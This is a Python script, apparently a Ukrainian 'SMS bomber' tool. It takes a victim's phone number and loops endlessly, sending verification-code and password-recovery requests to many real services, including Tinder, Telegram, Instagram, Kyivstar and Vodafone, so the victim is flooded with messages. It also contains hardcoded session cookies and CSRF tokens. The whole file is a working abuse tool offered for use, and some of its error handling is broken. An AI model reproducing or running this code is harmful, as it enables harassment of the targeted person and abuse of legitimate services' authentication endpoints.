import requests
import requests, time, os
from colorama import *
init(autoreset= True)
version = (Fore.WHITE+"1.6")


white=["502450890", "955305382", "0996369303", "0634397389"]

b = Fore.BLUE
y = Fore.GREEN

print(b + "    ____             _                    ")
print(y + "   / __ )____  ___  (_)___  ____ _     __ ")
print(b + "  / __  / __ \/ _ \/ / __ \/ __ `/  __/ /_")
print(y + " / /_/ / /_/ /  __/ / / / / /_/ /  /_  __/")
print(b + "/_____/\____/\___/_/_/ /_/\__, /    /_/   ")
print(y + "                         /____/           ")
print(Fore.BLUE+ "Versoin: " + version+'')
print(Fore.BLUE+'Telegram'+Fore.WHITE+" @python_for_android_and_termux")
print(Fore.BLUE+'Instagram'+Fore.WHITE+" @Valtasar_ua")
print(Fore.RED+' __________________________')
print(Fore.RED+'|' +Fore.WHITE+'Введіть номер телефону👇 '+Fore.RED+'/   ')
print(Fore.RED+'|________________________/\n')


num = input(Fore.GREEN+ '+380: '+Fore.WHITE)
if num in white:
	print(Fore.RED+"Цей номер у білому списку! 🌟  " )

else:
	while True:
		try:
				re1 = requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=uk", data = {"phone_number":'380'+num},)
				print(Fore.GREEN+'Надіслано! ☠️  ',re1,'Tinder')
		except:
			print(Fore.RED+'Помилка!		',re1,'Tinder')
		
		try:
			re2 = requests.get(f'https://shop.kyivstar.ua/api/v2/otp_login/send/380{num}')
			print(Fore.GREEN+'Надіслано! ☠️  ',re2,'Kyivstar')
		except:
			print(Fore.RED+'Помилка!		',re2,'Kyivstar')
	
		try:
			re4 = requests.post("https://rider.uklon.com.ua/api/v1/phone/send-code", json={'username':'+380'+num}, headers={'X-Requested-With':'XMLHttpRequest', 'strict-transport-security': 'max-age=15724800; includeSubDomains', 'x-correlation-id': 'c3208fdf-4dd7-4bca-aa84-2c686c1e2f60', 'sentry-trace': '796731cc91f54825a3e0435bebc67587-a104fb30d8b1adfc-1', 'uklon-agent': 'UklonPwa/1.16.0.182484', 'referer': 'https://m.uklon.com.ua/', 'locale': 'uk', 'client_id': '04F2BB99734848E1A061140A7452D1A9', 'app_uid': '9e33ffae-0ffd-4361-8bed-869b9ec94cb1', 'city': 'kyiv', 'cf-ray': '6a7f973a9ac12319-KBP', 'content-length': '0', 'Connection':'keep-alive', 'Pragma':'no-cache', 'Cache-Control':'no-cache', 'Accept-Encoding':'gzip, deflate, br', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36', 'DNT':'1'},)
			print(Fore.GREEN+'Надіслано! ☠️  '  ,re4,'Uklon')
		except:
			print(Fore.RED+'Помилка!		',re4, 'Uklon')
				
	
		
		try:
			re7 = requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+380"+num})
			print(Fore.GREEN+'Надіслано! ☠️  ',re7, 'Telegram')
		except:
			print(Fore.RED+'Помилка!		',re7, 'Telegram')
			
		try:
			re8= requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": "380"+num})
			print(Fore.GREEN+'Надіслано! ☠️  ',re8, 'Vodafone')
		except:
			print(Fore.RED+'Помилка!		',re8,'Vodafone')
			
		try:
			re11 = requests.post("https://megasport.ua/api/auth/phone/?language=ru", json={"phone": "+380"+num})
			print(Fore.GREEN+'Надіслано! ☠️  ',re11, 'MEGASPORT')
		except:
			print(Fore.RED+'Помилка!		',re11,'MEGASPORT')
				
		try:
			re13 = requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/", data={'email_or_username': "380"+num}, headers={'accept-encoding':'gzip, deflate, br', 'accept-language':'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded', 'cookie':'ig_did=06389D42-D5BA-42C2-BCA6-49C2913D682B; csrftoken=SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL; mid=XyIqeAALAAF1N7j0GbPCNuWhznuX; rur=FRC; urlgen="{\"109.252.48.249\": 25513\054 \"109.252.48.225\": 25513}:1k5JBz:E-7UgfDDLsdtlKvXiWBUphtFMdw"','referer':'https://www.instagram.com/accounts/password/reset/', 'origin':'https://www.instagram.com','user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 OPR/69.0.3686.95 (Edition Yx)','x-csrftoken':'SSEx9Bf0HmcQ8uCJVmh66Z4qBhu1F0iL', 'x-ig-app-id':'936619743392459','x-instagram-ajax': 'a9aec8fa634f', 'x-requested-with': 'XMLHttpRequest'})
			print(Fore.GREEN+'Надіслано! ☠️  ',re13, 'Instagram')
		except:
			print(Fore.RED+'Помилка!		',re13,'Instagram')
		
		try:
			re19=requests.post("https://bi.ua/api/v1/accounts",json={"grand_type": "sms_code","login": "Сергей", "phone": "380"+num,"stage": "1"})
			print(Fore.GREEN+'Надіслано! ☠️  ',re19,'Bi.ua')
		except:
			print(Fore.RED+'Помилка!		',re19,'Bi.ua')
		try:
			re20=requests.post("https://kazan-divan.eatery.club/site/v1/pre-login",json={"phone":"+380"+num})
			print(Fore.GREEN+'Надіслано! ☠️  ',re20,'KazanDivan')
		except:
			print(Fore.RED+'Помилка!		',re20,'KazanDivan')
			
		try:
			re21 = requests.post('https://api.telemed.care/oauth/verify_phone_number',json={"phone_number":"+380"+num},headers={'Connection': 'Keep-Alive','Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/3.14.8'})
			print(Fore.GREEN+'Надіслано! ☠️  ',re21,'TelemedCar')
		except:
			print(Fore.RED+'Помилка!		',re21,'TelemedCare')
			
			try:
				re = requests.post("https://parimatch.com/api/v3/password/recovery/init",
	json={"formName":"RECOVERY","selectedLanguage":"uk","phone":"+380"+num},)
				print(Fore.GREEN+'Надіслано! ☠️  ',re21,'PariMatch')
			except:
				print(Fore.RED+'Помилка!		',re21,'PariMatch')
			
			
		print(Fore.BLUE+'КОЛО')
		